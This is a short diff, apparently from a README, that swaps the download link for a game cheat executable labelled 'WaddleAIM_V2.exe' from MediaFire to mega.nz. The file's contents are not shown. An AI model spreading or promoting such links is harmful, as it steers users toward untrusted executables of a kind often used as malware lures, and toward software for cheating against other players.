@@ -6,7 +6,7 @@
 
 # Download cheat
 
-|[CHEAT](https://www.mediafire.com/file/c1q55lhtvxug5jm/WaddleAIM_V2.exe/file)|
+|[CHEAT](https://mega.nz/file/yfpiUDoQ#ajnp6d1GWXhmpCLdmLFtUHaGCDHMtMoC_e8JY1RCqqo)|
 
 -----------------------------------------------------------------------------------------------------------------------
 
